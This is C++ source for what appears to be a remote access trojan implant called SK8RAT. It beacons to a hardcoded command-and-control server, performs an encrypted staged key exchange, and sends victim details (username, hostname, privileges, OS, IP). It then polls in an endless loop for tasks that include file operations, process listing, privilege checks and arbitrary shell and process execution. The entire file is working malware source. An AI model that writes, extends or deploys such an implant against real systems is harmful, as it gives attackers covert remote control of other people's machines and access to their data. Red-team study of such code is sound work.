#include "CommandControl.h"
#include "sodium/sodium.h"
#pragma comment (lib,"sodium/libsodium")
#include "base64.h"
#include "Helper.h"
#include "json.hpp"
#include <atlconv.h>
using json = nlohmann::json;

// Global variables: ip/hostname, port, stage0 uri, stage1 uri, stage2 uri, stage3 uri, beacon uri
// listener_id, symetric key, sleep, jitter
std::string server_ip = "192.168.128.40";
std::string stage0_uri = "/stage0";
std::string stage1_uri = "/stage1";
std::string stage2_uri = "/stage2";
std::string stage3_uri = "/stage3";
std::string beacon_uri = "/beaconing";
int server_port = 5000;
int listener_id = 1;
int sleep = 5;
int jitter = 10;

void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie) 
{
	// Generate shared symetric key (don't think I need to hardcode this)
	unsigned char sharedkey[crypto_secretbox_KEYBYTES];
	crypto_secretbox_keygen(sharedkey);

	// Generate asymetric key pair
	unsigned char client_publickey[crypto_box_PUBLICKEYBYTES];
	unsigned char client_privatekey[crypto_box_SECRETKEYBYTES];
	crypto_box_keypair(client_publickey, client_privatekey);

	// Generate GUID for all further requests
	GUID guid;
	CoCreateGuid(&guid);
	OLECHAR* guidString;
	StringFromCLSID(guid, &guidString);
	USES_CONVERSION;
	std::string sguid_temp = OLE2CA(guidString);
	std::string sguid = sguid_temp.substr(1, sguid_temp.size() - 2);
	::CoTaskMemFree(guidString);
	
	// Prepare nonce for confidentiality
	unsigned char nonce[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce, sizeof nonce);

	// Generate ciphertext
	int ciphertext_len = crypto_secretbox_MACBYTES + crypto_box_PUBLICKEYBYTES;
	unsigned char* ciphertext = new unsigned char[ciphertext_len](); //USE DELETE() WHEN COMPLETE
	int generate_cipher = crypto_secretbox_easy(ciphertext, client_publickey, crypto_box_PUBLICKEYBYTES, nonce, sharedkey);
	
	// Prepare stage0 message + POST to server
	std::string ciphertext_b64 = base64_encode(ciphertext, ciphertext_len);
	std::string sharedkey_b64 = base64_encode(sharedkey, crypto_secretbox_KEYBYTES);
	std::string nonce_b64 = base64_encode(nonce, crypto_secretbox_NONCEBYTES);
	std::string send_stage0 = sguid + ":" + sharedkey_b64 + ":" + nonce_b64 + ":" + ciphertext_b64;
	
	// Send to server, obtain response
	std::string server_response = "";
	agent_post(server_ip, server_port, stage0_uri, send_stage0, server_response);
	
	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response.at(0) == '"')
	{
		server_response.erase(0, 1);
		server_response.erase(server_response.find('"'));
	}

	// Recieve response and decrypt
	std::string sessionkey_encrypted = base64_decode(server_response);
	const unsigned char* csessionkey_encrypted = (const unsigned char *)sessionkey_encrypted.c_str();
	unsigned char* sessionkey = new unsigned char[size(sessionkey_encrypted)](); //USE DELETE() WHEN COMPLETE
	if (crypto_box_seal_open(sessionkey, csessionkey_encrypted, size(sessionkey_encrypted), client_publickey, client_privatekey) != 0) {
		printf("session key decryption failed :(\n");
		return; 
	}

	// Generate 4 random bytes for challenge-response
	unsigned char client_challenge[4];
	randombytes_buf(client_challenge, sizeof client_challenge);

	// Prepare nonce for confidentiality
	unsigned char nonce2[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce2, sizeof nonce2);

	// Generate ciphertext
	int ciphertext_len2 = crypto_secretbox_MACBYTES + sizeof client_challenge;
	unsigned char* ciphertext2 = new unsigned char[ciphertext_len2](); //USE DELETE() WHEN COMPLETE
	int generate_cipher2 = crypto_secretbox_easy(ciphertext2, client_challenge, sizeof client_challenge, nonce2, sessionkey);

	//Prepare /stage1 message
	std::string ciphertext2_b64 = base64_encode(ciphertext2, ciphertext_len2);
	std::string nonce2_b64 = base64_encode(nonce2, crypto_secretbox_NONCEBYTES);
	std::string send_stage1 = sguid + ":" + nonce2_b64 + ":" + ciphertext2_b64;

	//POST challenge response to /stage1
	std::string server_response2 = "";
	agent_post(server_ip, server_port, stage1_uri, send_stage1, server_response2);
	
	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response2.at(0) == '"')
	{
		server_response2.erase(0, 1);
		server_response2.erase(server_response2.find('"'));
	}

	// Parse server response K[client_challenge+server_challenge]
	std::string delimiter = ":";
	std::string nonce3 = base64_decode(server_response2.substr(0, server_response2.find(delimiter)));
	std::string ciphertext3 = base64_decode(server_response2.substr(server_response2.find(":") + 1));
	const unsigned char* cnonce3 = (const unsigned char *)nonce3.c_str();
	const unsigned char* cciphertext3 = (const unsigned char *)ciphertext3.c_str();

	// Decrypt server response with sessionkey
	unsigned char client_server_challenge[8];
	if (crypto_secretbox_open_easy(client_server_challenge, cciphertext3, size(ciphertext3), cnonce3, sessionkey) != 0) {
		printf("challenge-response decryption failed :(\n");
		return;
	}

	// Parse client_server_challenge
	unsigned char client_challenge_returned[4];
	unsigned char server_challenge[4];
	memcpy(client_challenge_returned, client_server_challenge, 4);
	memcpy(server_challenge, client_server_challenge + 4, 4);

	// Compare client_challenge and client_challenge_returned
	if (memcmp(client_challenge, client_challenge_returned, 4))
	{
		printf("client challenge doesn't match, potential MITM!!!\n");
		return;
	}

	// Prepare nonce for confidentiality
	unsigned char nonce_stage2[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce_stage2, sizeof nonce_stage2);

	// Generate ciphertext K[server_challenge] to POST to stage2
	int ciphertext_stage2_len = crypto_secretbox_MACBYTES + sizeof server_challenge;
	unsigned char* ciphertext_stage2 = new unsigned char[ciphertext_stage2_len](); //USE DELETE() WHEN COMPLETE
	int generate_ciphertext_stage2 = crypto_secretbox_easy(ciphertext_stage2, server_challenge, sizeof server_challenge, nonce_stage2, sessionkey);
	
	// Prepare stage2 message
	std::string ciphertext_stage2_b64 = base64_encode(ciphertext_stage2, ciphertext_stage2_len);
	std::string nonce_stage2_b64 = base64_encode(nonce_stage2, crypto_secretbox_NONCEBYTES);
	std::string send_stage2 = sguid + ":" + nonce_stage2_b64 + ":" + ciphertext_stage2_b64;

	// POST K[server_challenge] to /stage2
	std::string server_response3 = "";
	agent_post(server_ip, server_port, stage2_uri, send_stage2, server_response3);
	
	// If server response is 0, exit
	if (server_response3 == "0\n")
	{
		printf("server challenge doesn't match, potential MITM!!\n");
		return;
	}

	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response3.at(0) == '"')
	{
		server_response3.erase(0, 1);
		server_response3.erase(server_response3.find('"'));
	}

	// Parse server response
	std::string nonce4 = base64_decode(server_response3.substr(0, server_response3.find(delimiter)));
	std::string ciphertext4 = base64_decode(server_response3.substr(server_response3.find(":") + 1));
	const unsigned char* cnonce4 = (const unsigned char *)nonce4.c_str();
	const unsigned char* cciphertext4 = (const unsigned char *)ciphertext4.c_str();
	
	// Decode implant's unique session cookie
	unsigned char session_cookie[15];
	if (crypto_secretbox_open_easy(session_cookie, cciphertext4, size(ciphertext4), cnonce4, sessionkey) != 0) {
		printf("session_cookie decryption failed :(\n");
		return;
	}
	std::stringstream temp;
	temp << session_cookie;
	std::string ssessioncookie = temp.str();

	// Create check-in message
	json j;
	j["name"] = nullptr;
	j["guid"] = sguid;
	j["username"] = get_username();
	j["hostname"] = get_computername();
	j["pid"] = get_pid();
	j["internal_ip"] = get_internalip();
	j["external_ip"] = nullptr;
	j["admin"] = is_admin();
	j["os"] = get_version();
	j["task"] = nullptr;
	j["task_output"] = nullptr;
	j["listener_id"] = listener_id;
	j["server_ip"] = server_ip;
	j["sleep"] = sleep;
	j["jitter"] = jitter;
	j["session_key"] = nullptr;
	j["client_challenge"] = nullptr;
	j["server_challenge"] = nullptr;
	j["session_cookie"] = ssessioncookie;
	j["last_seen"] = get_utctime();
	std::string sj = j.dump();
	int sj_size = sj.size();
	const unsigned char * sk8rat_checkin = reinterpret_cast<const unsigned char *> (sj.c_str());

	// Prepare nonce for confidentiality
	unsigned char nonce_stage3[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce_stage3, sizeof nonce_stage3);

	// Generate ciphertext for sk8rat first check-in
	int ciphertext_stage3_len = crypto_secretbox_MACBYTES + sj_size;
	unsigned char* ciphertext_stage3 = new unsigned char[ciphertext_stage3_len](); //USE DELETE() WHEN COMPLETE
	int generate_ciphertext_stage3 = crypto_secretbox_easy(ciphertext_stage3, sk8rat_checkin, sj_size, nonce_stage3, sessionkey);

	// Prepare first check-in message
	std::string ciphertext_stage3_b64 = base64_encode(ciphertext_stage3, ciphertext_stage3_len);
	std::string nonce_stage3_b64 = base64_encode(nonce_stage3, crypto_secretbox_NONCEBYTES);
	std::string send_stage3 = nonce_stage3_b64 + ":" + ciphertext_stage3_b64;

	// POST K[sk8rat_checkin] to /stage3
	std::string server_response4 = "";
	agent_post_cookie(server_ip, server_port, stage3_uri, ssessioncookie, send_stage3, server_response4);

	// Pass necessary variables out of function
	memcpy(symmetrickey, sessionkey, 32);
	sessioncookie = ssessioncookie;

	// Clean-up dynamically allocated heap
	delete(ciphertext);
	delete(sessionkey);
	delete(ciphertext2);
	delete(ciphertext_stage2);
	delete(ciphertext_stage3);

	// Sleep then return
	SleepJitter(sleep, jitter);
}

void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
{
	std::string encrypted_tasking = "";
	agent_get_cookie(server_ip, server_port, beacon_uri, sessioncookie, encrypted_tasking);

	// Clean " at beginning and end bc flask ... also cleans \n
	if (encrypted_tasking.at(0) == '"')
	{
		encrypted_tasking.erase(0, 1);
		encrypted_tasking.erase(encrypted_tasking.find('"'));
	}
	
	// Parse server response
	std::string nonce = base64_decode(encrypted_tasking.substr(0, encrypted_tasking.find(":")));
	std::string ciphertext = base64_decode(encrypted_tasking.substr(encrypted_tasking.find(":") + 1));
	const unsigned char* cnonce = (const unsigned char *)nonce.c_str();
	const unsigned char* cciphertext = (const unsigned char *)ciphertext.c_str();

	// Decrypt server response with sessionkey
	unsigned char* server_response = new unsigned char[size(ciphertext)](); //USE DELETE() WHEN COMPLETE
	
	if (crypto_secretbox_open_easy(server_response, cciphertext, size(ciphertext), cnonce, symmetrickey) != 0) {
		printf("challenge-response decryption failed :(\n");
		SleepJitter(sleep, jitter);
		return; //exits and starts tasking loop again essentially
	}

	// Parse json message
	std::string sserver_response(reinterpret_cast<char*>(server_response));
	json j = json::parse(sserver_response);

	// Update sleep and jitter on SK8RAT
	sleep = j["sleep"];
	jitter = j["jitter"];

	// Count tasks
	int task_count = j["task"].size();

	// Generate thread handle for each task on the heap
	// only needed for long running tasks, will handle later

	// Loop through tasks
	for (int i = 0; i < task_count; i++)
	{
		std::string temp = j["task"][i];
		if (temp.substr(0, 2) == "cd")
		{
			// This whole process is checking for paths with spaces
			std::string arguments = temp.substr(temp.find(" ") + 1);
			std::string arguments_parsed = ""; 
			for (int i = 0; i < arguments.length(); i++)
			{
				char c = arguments[i];
				if (c == ' ')
				{
					arguments_parsed += "\n";
				}
				else if (c == '\"')
				{
					i++;
					while (arguments[i] != '\"')
					{
						arguments_parsed += arguments[i];
						i++;
					}
				}
				else
				{
					arguments_parsed += c;
				}
			}
			std::string path = arguments_parsed.substr(0, arguments_parsed.find("\n"));
			// Perform the cd, update json blob
			cd(path);
			j["task_output"][i] = "no output";
			j["task_status"][i] = "complete";
			printf("Performing cd to %s\n", path.c_str());
		}
		if (temp.substr(0, 2) == "cp")
		{
			// This whole process is checking for paths with spaces
			std::string arguments = temp.substr(temp.find(" ") + 1);
			std::string arguments_parsed = "";
			for (int i = 0; i < arguments.length(); i++)
			{
				char c = arguments[i];
				if (c == ' ')
				{
					arguments_parsed += "\n";
				}
				else if (c == '\"')
				{
					i++;
					while (arguments[i] != '\"')
					{
						arguments_parsed += arguments[i];
						i++;
					}
				}
				else
				{
					arguments_parsed += c;
				}
			}
			std::string src_file = arguments_parsed.substr(0, arguments_parsed.find("\n"));
			std::string dest_file = arguments_parsed.substr(arguments_parsed.find("\n") + 1);
			// Perform the cp, update json blob
			cp(src_file, dest_file);
			j["task_output"][i] = "no output";
			j["task_status"][i] = "complete";
			printf("Performing cp %s %s\n", src_file.c_str(), dest_file.c_str());
		}
		if (temp.substr(0, 2) == "mv")
		{
			// This whole process is checking for paths with spaces
			std::string arguments = temp.substr(temp.find(" ") + 1);
			std::string arguments_parsed = ""; 
			for (int i = 0; i < arguments.length(); i++)
			{
				char c = arguments[i];
				if (c == ' ')
				{
					arguments_parsed += "\n";
				}
				else if (c == '\"')
				{
					i++;
					while (arguments[i] != '\"')
					{
						arguments_parsed += arguments[i];
						i++;
					}
				}
				else
				{
					arguments_parsed += c;
				}
			}
			std::string src_file = arguments_parsed.substr(0, arguments_parsed.find("\n"));
			std::string dest_file = arguments_parsed.substr(arguments_parsed.find("\n") + 1);
			// Perform the mv, update json blob
			mv(src_file, dest_file);
			j["task_output"][i] = "no output";
			j["task_status"][i] = "complete";
			printf("Performing mv %s %s\n", src_file.c_str(), dest_file.c_str());
		}
		if (temp == "whoami")
		{
			// Initialize structure on the heap
			createthread_in *ct_whoami_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_whoami_in->j = &j;
			ct_whoami_in->counter = i;
			ct_whoami_in->input = "";

			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, whoami_thread, ct_whoami_in, 0, 0);

			printf("Using CreateThread() to run whoami! ... Task Index: %i\n", i);
		}
		if (temp == "pwd")
		{
			// Initialize structure on the heap
			createthread_in *ct_pwd_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_pwd_in->j = &j;
			ct_pwd_in->counter = i;
			ct_pwd_in->input = "";

			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, pwd_thread, ct_pwd_in, 0, 0);

			printf("Using CreateThread() to run pwd! ... Task Index: %i\n", i);
		}
		if (temp == "drives")
		{
			// Initialize structure on the heap
			createthread_in *ct_drives_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_drives_in->j = &j;
			ct_drives_in->counter = i;
			ct_drives_in->input = "";

			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, drives_thread, ct_drives_in, 0, 0);

			printf("Using CreateThread() to run drives! ... Task Index: %i\n", i);
		}
		if (temp == "ps")
		{
			// Initialize structure on the heap
			createthread_in *ct_ps_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_ps_in->j = &j;
			ct_ps_in->counter = i;
			ct_ps_in->input = "";

			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, ps_thread, ct_ps_in, 0, 0);
			printf("Using CreateThread() to run ps! ... Task Index: %i\n", i);
		}
		if (temp == "privs")
		{
			// Initialize structure on the heap
			createthread_in *ct_privs_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_privs_in->j = &j;
			ct_privs_in->counter = i;
			ct_privs_in->input = "";

			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, privs_thread, ct_privs_in, 0, 0);
			printf("Using CreateThread() to run privs! ... Task Index: %i\n", i);
		}
		if (temp.substr(0,2) == "ls")
		{
			// Initialize structure on the heap
			createthread_in *ct_ls_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_ls_in->j = &j;
			ct_ls_in->counter = i;

			// Check for blank path, if path is blank we will ls current dir
			if (temp == "ls")
			{
				ct_ls_in->input = "";
			}
			else
			{
				ct_ls_in->input = temp.substr(temp.find(" ") + 1);
			}
		
			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, ls_thread, ct_ls_in, 0, 0);
			printf("Using CreateThread() to run 'ls %s'! ... Task Index: %i\n", (ct_ls_in->input).c_str(), i);
		}
		if (temp.substr(0, 10) == "shell_exec")
		{
			// Initialize structure on the heap
			createthread_in *ct_shell_exec_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_shell_exec_in->j = &j;
			ct_shell_exec_in->counter = i;
			ct_shell_exec_in->input = temp.substr(temp.find(" ") + 1);

			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, shell_exec_thread, ct_shell_exec_in, 0, 0);
			printf("Using CreateThread() to run 'shell_exec %s'! ... Task Index: %i\n", (ct_shell_exec_in->input).c_str(), i);
		}
		if (temp.substr(0, 19) == "create_process_exec")
		{
			// Initialize structure on the heap
			createthread_in *ct_create_process_exec_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_create_process_exec_in->j = &j;
			ct_create_process_exec_in->counter = i;
			ct_create_process_exec_in->input = temp.substr(temp.find(" ") + 1);

			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, create_process_exec_thread, ct_create_process_exec_in, 0, 0);
			printf("Using CreateThread() to run 'create_process_exec %s'! ... Task Index: %i\n", (ct_create_process_exec_in->input).c_str(), i);
		}
	}

	// Pause this thread to allow threads to complete, need to figure out how to do this smarter
	// This is literally so fucking dumb right now
	Sleep(3000);

	// Update last_seen
	j["last_seen"] = get_utctime();

	// Convert json blob to unsigned char
	std::string sj = j.dump();
	int sj_size = sj.size();
	const unsigned char * sk8rat_checkin = reinterpret_cast<const unsigned char *> (sj.c_str());

	// Prepare nonce for confidentiality
	unsigned char nonce_response[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce_response, sizeof nonce_response);

	// Generate ciphertext for sk8rat task checkin
	int ciphertext_response_size = crypto_secretbox_MACBYTES + sj_size;
	unsigned char* ciphertext_response = new unsigned char[ciphertext_response_size](); //USE DELETE() WHEN COMPLETE
	int generate_ciphertext_response = crypto_secretbox_easy(ciphertext_response, sk8rat_checkin, sj_size, nonce_response, symmetrickey);

	// Prepare sk8rat task response message
	std::string ciphertext_response_b64 = base64_encode(ciphertext_response, ciphertext_response_size);
	std::string nonce_response_b64 = base64_encode(nonce_response, crypto_secretbox_NONCEBYTES);
	std::string send_response = nonce_response_b64 + ":" + ciphertext_response_b64;

	// POST K[sk8rat_checkin] to /beaconing
	std::string server_response2 = "";
	agent_post_cookie(server_ip, server_port, beacon_uri, sessioncookie, send_response, server_response2);

	// Clean-up dynamically allocated memory
	delete(server_response);
	delete(ciphertext_response);
	
	// Sleep then return
	printf("Sleeping for %i second(s) with %i%% jitter\n\n", sleep, jitter);
	SleepJitter(sleep, jitter);
}

int main(int argc, char **argv)
{
	// Perform encrypted key exchange and save final symmetric key and session cookie
	unsigned char symmetrickey[32] = {};
	std::string sessioncookie = "";
	SK8RAT_EKE(symmetrickey, sessioncookie);

	// Begin tasking loop, you will infinite loop this
	while (true)
	{
		printf("Polling SK8PARK for tasking ...\n");
		SK8RAT_tasking(symmetrickey, sessioncookie);
	}

	
	
	/*
	DWORD data = NULL;
	BOOL check = GetExitCodeThread(threadhandle, &data);
	if (data == STILL_ACTIVE)
	{
		printf("thread is running still\n");
		//kill thread?
	}
	else
	{
		printf("thread exited\n");
		std::string lol = (*j)["test"];
		printf("mainthread: %s\n", lol.c_str());

	}
	*/

	//std::string lol = create_process_exec2("ping localhost -n 5");
	//printf("%s\n", lol.c_str());

	//std::string lol = ls("C:\\Users");
	//printf("%s\n", lol.c_str());

	//DEBUG ONLY
	system("pause");
	return 0;
}